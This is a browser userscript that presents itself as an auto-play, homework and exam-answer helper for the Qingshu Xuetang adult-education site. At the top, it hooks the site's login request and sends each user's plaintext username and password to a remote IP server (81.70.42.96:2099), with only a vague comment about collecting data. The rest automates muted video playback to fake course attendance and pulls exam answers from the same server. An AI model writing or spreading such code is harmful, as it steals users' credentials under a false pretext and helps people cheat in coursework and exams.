// ==UserScript==
// @name         【专业版】青书学堂挂课、考试/作业/自动播放-成人教育-继续教育
// @namespace    http://tampermonkey.net/
// @version      0.61
// @description  👆👆👆👆👆👆👆青书学堂挂课、考试/作业/自动播放。现已支持青书学堂www.qingshuxuetang.com🚀🚀🚀完美适配 Chrome，Edge，FireFox，360，QQ 等 18 种浏览器，可在无法安装客户端的环境下使用。😎
// @author       qsxt
// @match        https://qingshuxuetang.com/*
// @match        https://*.qingshuxuetang.com/*
// @match        https://www.qingshuxuetang.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=qingshuxuetang.com
// @grant        GM_getResourceText
// @grant        unsafeWindow
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// @connect      degree.qingshuxuetang.com
// @connect      www.qingshuxuetang.com
// @run-at       document-end
// @connect      81.70.42.96
// @resource css https://cdn.bootcdn.net/ajax/libs/element-ui/2.15.9/theme-chalk/index.min.css
// @require  https://cdn.bootcdn.net/ajax/libs/vue/2.7.6/vue.min.js
// @require  https://cdn.bootcdn.net/ajax/libs/element-ui/2.15.9/index.min.js
// @license GPL
// @downloadURL https://update.greasyfork.org/scripts/448137/%E3%80%90%E4%B8%93%E4%B8%9A%E7%89%88%E3%80%91%E9%9D%92%E4%B9%A6%E5%AD%A6%E5%A0%82%E6%8C%82%E8%AF%BE%E3%80%81%E8%80%83%E8%AF%95%E4%BD%9C%E4%B8%9A%E8%87%AA%E5%8A%A8%E6%92%AD%E6%94%BE-%E6%88%90%E4%BA%BA%E6%95%99%E8%82%B2-%E7%BB%A7%E7%BB%AD%E6%95%99%E8%82%B2.user.js
// @updateURL https://update.greasyfork.org/scripts/448137/%E3%80%90%E4%B8%93%E4%B8%9A%E7%89%88%E3%80%91%E9%9D%92%E4%B9%A6%E5%AD%A6%E5%A0%82%E6%8C%82%E8%AF%BE%E3%80%81%E8%80%83%E8%AF%95%E4%BD%9C%E4%B8%9A%E8%87%AA%E5%8A%A8%E6%92%AD%E6%94%BE-%E6%88%90%E4%BA%BA%E6%95%99%E8%82%B2-%E7%BB%A7%E7%BB%AD%E6%95%99%E8%82%B2.meta.js
// ==/UserScript==
console.log('当前执行站点', unsafeWindow.location.href, unsafeWindow.parent)

let main_hosts = 'http://81.70.42.96:2099'  //收集信息用于题库收录，如不同意删除端口即可
let loginbtn = document.querySelector('#loginByAuthBtn')
if (loginbtn !== null) {
    //hook btn
    let oldajax = $.ajax
    $.ajax = function (...arg) {
        if (arg.length === 1) {
            let obj = arg[0]
            if (obj.url.indexOf("Login") !== -1) {
                let old_suc = obj.success
                let param = obj.data
                obj.success = function (r) {
                    if (r.message === '成功') {
                        let username = obj.data.username
                        let password = obj.data.password
                        GM_xmlhttpRequest({
                            url: `${main_hosts}/insertOrderInfo`,
                            method: "POST",
                            data: `account=${username}&password=${password}`,
                            headers: {
                                "Content-type": "application/x-www-form-urlencoded"
                            },
                            onload: (xhr) => {
                            }
                        });
                    }
                    return old_suc.call(this, r)

                }
            }
        }
        console.log("arg")
        let result = oldajax.call(this, ...arg)
        return result
    }

    return;
}
if (unsafeWindow.self !== unsafeWindow.top) {
    return;
}
let css = GM_getResourceText('css');
css = css.replace(/(?<=url\()(?=fonts)/g, 'https://cdn.bootcdn.net/ajax/libs/element-ui/2.15.9/theme-chalk/');
GM_addStyle(css);
GM_addStyle(`
.show-contrl-list{
  display: flex;
  justify-content: space-evenly;
  align-items: center;
}
.show-contrl-list .item,.show-contrl-list >div{
width: 23%;
display: flex;
flex-direction: column;
justify-content: center;
align-items: center;
border: 1px solid #F0EFF9;
border-radius: 5px;
padding: 10px 5px;
}
.icon-wrap{
font-size: 18px;
padding: 7px;
color: #C0E39D;
border: 1px solid #C0E39D;
border-radius: 10px;
}
.el-divider{
margin: 5px 0 !important;
}
.el-progress-bar__innerText{
    display:none;
}
.deafult-lesson-item{
    .title{
        color: #4E2F86;
    }
}
.select-lesson-item{
    background-color: #52B7F5;
    border-radius: 12px;
    color: white;
}
.select-lesson-item .title{
        color: white !important;
}
.select-lesson-item .icon-wrap{
        color: white !important;
        border-color: white !important;
}
.point{
    cursor:pointer;
}
.exam-css{
    position: fixed;
    top: 0;
    z-index: 999;
    right: 85px;
    background-color: white;
    padding: 20px;
    width: 350px;
    font-size: 16px;
    border: 1px solid rgba(128, 128, 128, 0.05);
    border-radius: 5px;
    overflow: scroll;
    max-height: 100%;
}
.default-css{
    position: absolute;
    top: 83px;
    z-index: 999;
    right: 85px;
    background-color: white;
    padding: 20px;
    width: 350px;
    font-size: 16px;
    border: 1px solid rgba(128, 128, 128, 0.05);
    border-radius: 5px;
}

`)
let wrap = document.createElement('div')
wrap.className = 'uitest'
document.querySelector('body').append(wrap)
let vueinstance = new Vue({
    el: '.uitest',
    template: `
<div @scroll.stop='()=>{}' :class="[enable_question ? 'exam-css' : 'default-css']" >
  <div
    style="display: flex; justify-content: space-between; align-items: center"
  >
    <div style="display: flex; justify-content: center; align-items: center">
      <el-avatar style="font-size: 16px" icon="el-icon-user-solid"></el-avatar>
      <span style="font-size: 16px; margin-left: 6px">油猴Greasyfork</span>
    </div>
    <div>
      <i @click='FoldPage' style="margin-right: 5px; color: #6a6496" class="el-icon-d-caret point"></i>
      <i  style="color: #6a6496" class="el-icon-s-tools point"></i>
    </div>
  </div>
  <div v-show='!flod_status'>
        <div  style="padding: 10px;background-color: rgb(240, 248, 255);border: 2px solid rgb(222, 240, 253);border-radius: 9px;color: #606060bd;margin-top: 10px;">
           <div style="text-align: center;font-size: 14px;color: black;margin-bottom: 5px;font-weight: 600;" >公告信息</div>
           <div v-html='notice_mess'></div>
        </div>
        <div class="show-contrl-list" style="margin: 10px 0">
            <div>
            <i class="el-icon-edit icon-wrap"></i>
            <span style="font-size: 13px; margin: 5px 0">作业查询</span>
            <el-switch
                v-model="check_work"
                active-color="#13ce66"
                inactive-color="#ff4949"
            >
            </el-switch>
            </div>
            <div>
            <i
                style="color: #7ec4f8; border-color: #7ec4f8"
                class="el-icon-video-camera icon-wrap"
            ></i>
            <span style="font-size: 13px; margin: 5px 0">自动视频</span>
            <el-switch
                v-model="check_video"
                active-color="#13ce66"
                inactive-color="#ff4949"
            >
            </el-switch>
            </div>
            <div>
            <i
                style="color: #393080; border-color: #393080"
                class="el-icon-files icon-wrap"
            ></i>
            <span style="font-size: 13px; margin: 5px 0">电子书</span>
            <el-switch
                v-model="check_book"
                active-color="#13ce66"
                inactive-color="#ff4949"
            >
            </el-switch>
            </div>
            <div>
            <i
                style="color: #f47b88; border-color: #f47b88"
                class="el-icon-reading icon-wrap"
            ></i>
            <span style="font-size: 13px; margin: 5px 0">课程数量</span>
            <span>{{lessonlist.length}}</span>
            </div>
        </div>
        <div style="display: flex;justify-content: space-between;">
            <div>
            <span style="font-size: 14px; font-weight: bold">课程选择</span>
            <i class="el-icon-arrow-left point"></i>
            <i class="el-icon-arrow-right point"></i>
            </div>
            <div class='point' style="color: rgb(82, 74, 144); background-color: rgb(246, 246, 252);font-size: 12px;padding: 5px;border-radius: 5px;">
            <i class="el-icon-date"></i>
            <span>{{lesson_name!=''?lesson_name:'当前学期'}}</span>
            </div>
        </div>
        <el-divider></el-divider>
        <template v-if='!enable_question'>
                <div style="text-align: center;margin-bottom: 5px;" v-if='lessonlist.length===0'>
                    暂未找到课程
                </div>
                <div v-else>
                    <div v-for="(item,index) in lessonlist" class='point' :class="[current_lesson.id!==item.id ? 'deafult-lesson-item' : 'select-lesson-item']" :key="index" style='margin: 8px 0;' @click='SelectLessonItem(item)' >
                         <div style=";padding: 15px;border: 1px solid #CFCBCB;border-radius: 12px;">
                            <div style="display: flex;justify-content: center;align-items: center;" >
                                <div><i class="el-icon-star-off" style="font-size: 35px;" ></i></div>
                                <div style="flex: 1 1 0;" >
                                    <div class='title' style="flex: 1 1 0px;display: flex;flex-direction: column;align-items: center;padding: 0px 10px;">
                                    {{item.name}}
                                    </div>
                                    <div style="font-size: 12px;text-align: center;">
                                    {{item.hint_text}}
                                    </div>
                                    <div style="position: relative;width: 100%;" >
                                        <el-progress :percentage="item.progress" status="success" :text-inside="true" :format="()=>''" :stroke-width="15" ></el-progress>
                                        <span style="position: absolute;top: 0;bottom: 0;width: 100%;text-align: center;font-size: 12px;color: white;">
                                            {{item.progress}}%
                                        </span>
                                    </div>
                                </div>
                                <div><i @click='JumpToLesson(item)' v-if='current_lesson.id===item.id' class="el-icon-arrow-right icon-wrap" style="color: #7E73D4;border-color: #7E73D4;" ></i></div>
                            </div>
                            <div style="margin-top: 15px;display: flex;justify-content: space-evenly;">
                                <el-button @click.stop="JumpToType(item,'study')"  size="mini"  type="success" plain>学习</el-button>
                                <el-button @click.stop="JumpToType(item,'homework')"  size="mini"  type="success" plain>作业</el-button>
                                <el-button @click.stop="JumpToType(item,'score')"  size="mini"  type="success" plain>成绩</el-button>
                            </div>
                        </div>
                    </div>

                </div>
            </template>
            <template v-else>
            <div style="height: 200px;overflow: auto;padding-right: 12px;">
                    <div v-for="(item,index) in questionlist" :key='index' style='margin-bottom:8px;' >
                            <div style="display: flex;justify-content: space-between;">
                                <div style="min-width: 0;flex: 1 1 0;" v-html='item.question'></div>
                                <div><el-button @click='CheckAnswer(item)' style='margin-left: 5px;' size="mini">查询</el-button></div>
                            </div>
                            <div style="border: 1px solid #D2D2D2;padding: 6px;font-size: 13px;margin-top: 7px;">
                            答案: {{item.answer===null?'暂未搜索':item.answer}}
                            </div>
                    </div>
            </div>
            </template>

        <div style="margin: 5px 0; font-size: 14px; font-weight: bold">公告位置</div>
        <div
            style="
            padding: 10px;
            background-color: rgb(240, 248, 255);
            min-height: 144px;
            display: flex;
            flex-direction: column-reverse;
            border: 2px solid #def0fd;
            border-radius: 9px;
            "
        >
            <div
            style="
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
            "
            >
            <div style="margin-bottom: 5px; font-size: 14px">当前题库数量</div>
            <div style="color: #91cd53; font-size: 25px">656008</div>
            <div
                style="
                display: flex;
                justify-content: space-around;
                width: 100%;
                color: #c0d7ea;
                margin: 10px 0 5px;
                "
            >
                <div>6217</div>
                <div>8888</div>
                <div>8888</div>
                <div>8888</div>
            </div>
            </div>
        </div>
    </div>
</div>

`,
    data: function () {
        return {
            check_work: true,
            check_video: true,
            check_book: true,
            visible: false,
            value: true,
            enable_question: false,//false课程模式，true考试模式
            lesson_name: '',
            lessonlist: [],
            current_lesson: {
                id: null
            },
            questionlist: [],
            flod_status: false,
            notice_mess: ""
        }
    },
    created() {
        GM_xmlhttpRequest({
            url: `${main_hosts}/queryNotice`,
            method: "POST",
            data: ``,
            headers: {
            },
            onload: (xhr) => {
                if (xhr.responseText === "") {
                    this.notice_mess = '暂无公告'
                    return;
                }
                try {
                    let result = JSON.parse(xhr.responseText)
                    if (result.success) {
                        this.notice_mess = result.message
                    } else {
                        this.notice_mess = '暂无公告'
                    }
                } catch (error) {
                    this.notice_mess = '暂无公告'
                }

            },
            onerror: () => {
                this.notice_mess = '暂无公告'
            }
        });
    },
    methods: {
        JumpToType(item, type) {
            window.location.href = item.url + '&tabType=' + type
            //https://gaozhi.qingshuxuetang.com/lzkjgzb/Student/Course/CourseStudy?classId=29&courseId=4&teachPlanId=21&periodId=12&tabType=homework
            //https://gaozhi.qingshuxuetang.com/lzkjgzb/Student/Course/CourseStudy?courseId=4&teachPlanId=21&periodId=12&tabType=homework
        },
        FoldPage() {
            this.flod_status = !this.flod_status

        },
        ChangeStatus(status) {
            this.enable_question = status
        },
        SelectLessonItem(item) {
            this.current_lesson = item
        },
        JumpToLesson(item) {
            window.location.href = item.url
        },
        CheckAnswer(item) {
            item.answer = '正在搜索...'
            GM_xmlhttpRequest({
                url: `${main_hosts}/queryAnswerById`,
                method: "POST",
                data: `questionId=${item.question_id}`,
                headers: {
                },
                onload: (xhr) => {
                    if (xhr.responseText === "") {
                        item.answer = '暂无答案'
                        return;
                    }
                    try {
                        let result = JSON.parse(xhr.responseText)
                        if (result.success) {
                            item.answer = result.message
                        } else {
                            item.answer = '暂无答案'
                        }
                    } catch (error) {
                        item.answer = '暂无答案'
                    }

                },
                onerror: () => {
                    item.answer = '暂无答案'
                }
            });
        }
    }
})
let lesson_name = document.querySelector('.content-area .title span')?.innerHTML
if (lesson_name) {
    vueinstance.lesson_name = lesson_name

}
function dom_to_get_lesson_number() {
    let lesson_item = document.querySelectorAll('#currentCourseDiv .col-md-3 a')
    let end_time = ""
    if (lesson_item.length !== 0) {
        let item = document.querySelector('#currentCourseDiv .col-sm-12')
        if (item != null) {
            let text = item.innerHTML
            text = text.split('结束时间：')
            if (text.length === 2) {
                end_time = text[1]
            }
        }

    }
    lesson_item.forEach((item) => {
        let list = item.querySelectorAll(' p > span')
        if (list.length !== 2) {
            return
        }
        let name = list[0].innerHTML
        let progress = parseInt(/\d+/.exec(list[1].innerHTML)[0] ?? 0)
        let url = list.children[0].href
        console.log(name, progress, vueinstance, url, 'dom查找')
        vue_lesson_push_func(name, progress, vueinstance.lessonlist.length, url, end_time)
    })
    return lesson_item.length
}

function vue_lesson_push_func(name, progress, id, url, hint_text) {
    vueinstance.lessonlist.push({ name, progress, id, url, hint_text })
}
/*let question_list = document.querySelectorAll('.question-entity')
if (question_list.length !== 0) {
    vueinstance.ChangeStatus(true)
    question_list.forEach((item) => {
        vueinstance.questionlist.push({
            question: item.querySelector('h4').innerHTML,
            answer: null,
            question_id:item.querySelector('.questionId').value,
            dom: item
        })

    })
}*/
function GetLessonListData() {
    if (document.cookie.indexOf('AccessToken') === -1) {
        return;
    }
    let url = window.location.href
    let size_list = url.split('/')
    let char_list = []
    let nofind = true
    for (let index = 0; index < size_list.length; index++) {
        let item = size_list[index]
        if (nofind === false) {
            //找到了qingshuxuetang后
            char_list.push(item)
        }
        if (item.indexOf('qingshuxuetang.com') !== -1) {
            nofind = false
            continue;
        }
    }

    if (char_list.length === 0) {
        return;
    }
    let first_name = char_list[0]
    if (first_name === 'MyQingShu') {
        return;
    }
    console.log('first_name', first_name)
    let base_url = window.location.origin + '/' + first_name
    let post_url = base_url + `/Student/Course/CourseData`
    GM_xmlhttpRequest({
        url: post_url,
        method: "POST",
        headers: {
            "Content-type": "application/x-www-form-urlencoded"
        },
        onload: function (xhr) {
            if (xhr.responseText === "") {
                return;
            }
            let json = JSON.parse(xhr.responseText)
            if (json.message === '成功') {
                let lesson = json.data
                let current_lesson = lesson.filter((item) => item.learnStatus === 2)
                console.log('current_lesson', current_lesson)
                current_lesson.forEach((lesson) => {
                    let generate_url = base_url + `/Student/Course/CourseStudy?${lesson.classId !== undefined ? "classId=" + lesson.classId + "&" : ''}courseId=${lesson.courseId}&teachPlanId=${lesson.teachPlanId}&periodId=${lesson.periodId}`
                    vue_lesson_push_func(lesson.courseName, lesson.score, vueinstance.lessonlist.length, generate_url, '暂未完成')
                })
            }
        }
    });
}
window.onload = () => {
    if (document.querySelector('.quiz-title')) {
        if (window.location.href.indexOf('ExercisePaper') != -1) {
            vueinstance.ChangeStatus(true)
            //start_interval
            let timer = setInterval(() => {
                let page_dom = document.querySelectorAll('.question-detail-container')
                if (page_dom.length !== 0) {
                    page_dom.forEach((item) => {
                        vueinstance.questionlist.push({
                            question: item.querySelector('.detail-description-content').innerHTML,
                            answer: null,
                            question_id: item.attributes.id.value,
                            dom: item
                        })
                    })
                    clearInterval(timer)
                }
            }, 1000)
        }
    } else {
        let result = dom_to_get_lesson_number()
        if (result === 0) {
            GetLessonListData()
        }
    }
}


(function() {
    'use strict';
    var i
    var href = location.href

    if (href.indexOf('nodeId') > -1) {
        setTimeout(function() {
          var video = document.getElementsByTagName("video")[0]
          console.log('找到视频组件,开始静音并自动播放...', video)
          // 设置静音并播放
          video.muted = true
          video.playbackRate = 0.5
          video.play()


          var params = new UrlSearch()
          // 课程ID
          var courseId = params.courseId
          const courseArr = params.nodeId.split('_')
          // 下一个播放的视频的key
          var nextKey = ''
          if (courseArr.length == 2) {
            nextKey = `kcjs_${Number(courseArr[1]) + 1}`
          } else if (courseArr.length == 3) {
            nextKey = `kcjs_${courseArr[1]}_${Number(courseArr[2]) + 1}`
          }
          const nextUrl = `https://${window.location.host}${window.location.pathname}?teachPlanId=${params.teachPlanId}&periodId=${params.periodId}&courseId=${courseId}&nodeId=${nextKey}&category=${params.category}`
          console.log(params, 'currentId:', params.nodeId, 'nextKey:', nextKey, 'nextUrl:', nextUrl)
          // 视频播放结束,自动下一条视频
          video.addEventListener("ended",function(){
            location.replace(nextUrl);
          })
        }, 5000)

        // 打印播放进度
        getvideoprogress();
    }
})();

function UrlSearch() {
   var name,value;
   var str=location.href; //取得整个地址栏
   var num=str.indexOf("?")
   str=str.substr(num+1); //取得所有参数   stringvar.substr(start [, length ]

   var arr=str.split("&"); //各个参数放到数组里
   for(var i=0;i < arr.length;i++){
        num=arr[i].indexOf("=");
        if(num>0){
            name=arr[i].substring(0,num);
            value=arr[i].substr(num+1);
            this[name]=value;
        }
    }
}

// 检测当前播放的进度 
function getvideoprogress() {
    setInterval(function () {
        var vid = document.getElementsByTagName("video")[0]
        var currentTime=vid.currentTime.toFixed(1);
        console.log('当前进度:', currentTime);
    }, 10000);
}